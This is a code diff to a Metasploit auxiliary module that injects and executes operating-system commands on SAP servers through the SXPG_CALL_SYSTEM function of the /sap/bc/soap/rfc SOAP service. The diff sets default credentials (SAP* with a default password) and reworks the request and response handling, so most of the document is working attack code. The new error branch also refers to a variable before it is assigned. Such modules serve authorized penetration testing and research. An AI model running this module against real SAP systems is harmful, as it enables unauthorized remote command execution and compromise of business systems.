@@ -19,38 +19,45 @@
 require 'msf/core'
 
 class Metasploit4 < Msf::Auxiliary
-	
+
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
 
 	def initialize
 		super(
-			'Name' => 'SAP SOAP RFC DBMCLI Command Injection (via SXPG_CALL_SYSTEM)',
-			'Version' => '$Revision: $0.1',
+			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection',
 			'Description' => %q{
-				This module makes use of the SXPG_CALL_SYSTEM Remote Function Call
-				(via SOAP) to execute OS commands via DBMCLI command as configured in SM69.
-				},
-				'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-				'Author'	=> [ 'nmonkee' ],
-				'License'	=> BSD_LICENSE
+					This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the
+				use of the /sap/bc/soap/rfc SOAP service, to inject and execute OS commands.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ],
+					[ 'URL', 'http://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection' ]
+				],
+			'Author' =>
+				[
+					'Agnivesh Sathasivam',
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
 			)
 		register_options(
 			[
-				OptString.new('CLIENT', [true, 'Client', nil]),
-				OptString.new('USERNAME', [true, 'Username', nil]),
-				OptString.new('PASSWORD', [true, 'Password', nil]),
+				OptString.new('CLIENT', [true, 'SAP Client', '001']),
+				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+				OptString.new('PASSWORD', [true, 'Password', '06071992']),
 				OptEnum.new('OS', [true, 'Target OS', "linux", ['linux','windows']]),
 				OptString.new('CMD', [true, 'Command to run', "id"])
 			], self.class)
 	end
 
 	def run_host(ip)
-		payload,command = create_payload(1)
-		exec_command(ip,payload,command)
-		payload,command = create_payload(2)
-		exec_command(ip,payload,command)
+		payload = create_payload(1)
+		exec_command(ip,payload)
+		payload = create_payload(2)
+		exec_command(ip,payload)
 	end
 
 	def create_payload(num)
@@ -82,10 +89,10 @@ class Metasploit4 < Msf::Auxiliary
 		data << '</n1:SXPG_CALL_SYSTEM>' + "\r\n"
 		data << '</env:Body>' + "\r\n"
 		data << '</env:Envelope>' + "\r\n"
-		return data, command
+		return data
 	end
 
-	def exec_command(ip,data,command)
+	def exec_command(ip,data)
 		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
 		print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_CALL_SYSTEM request")
 		begin
@@ -105,18 +112,18 @@ class Metasploit4 < Msf::Auxiliary
 			if res and res.code != 500 and res.code != 200
 				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
 				return
-			else
-				success = true
-				print_status("[SAP] #{ip}:#{rport} - got response")
-				response = res.body if res
-				if response =~ /faultstring/
-					error = response.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
-					sucess = false
+			elsif res and res.body =~ /faultstring/
+				error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
+				0.upto(output.length-1) do |i|
+					print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
 				end
-				output = response.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
+				return
+			elsif res
+				print_status("[SAP] #{ip}:#{rport} - got response")
+				output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
 				result = []
 				0.upto(output.length-1) do |i|
-					if output[i] =~ /E[rR][rR]/ || output[i] =~ /---/ || output[i] =~ /for database \(/ 
+					if output[i] =~ /E[rR][rR]/ || output[i] =~ /---/ || output[i] =~ /for database \(/
 						#nothing
 					elsif output[i] =~ /unknown host/ || output[i] =~ /; \(see/ || output[i] =~ /returned with/
 						#nothing
@@ -141,15 +148,14 @@ class Metasploit4 < Msf::Auxiliary
 					saptbl << [result[i].chomp]
 				end
 				print (saptbl.to_s)
+				return
+			else
+				print_error("[SAP] #{ip}:#{rport} - Unknown error")
+				return
 			end
 		rescue ::Rex::ConnectionError
 			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
 			return
-		end
-		if sucess == false
-			0.upto(output.length-1) do |i|
-				print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
-			end
 		end
 	end
 end
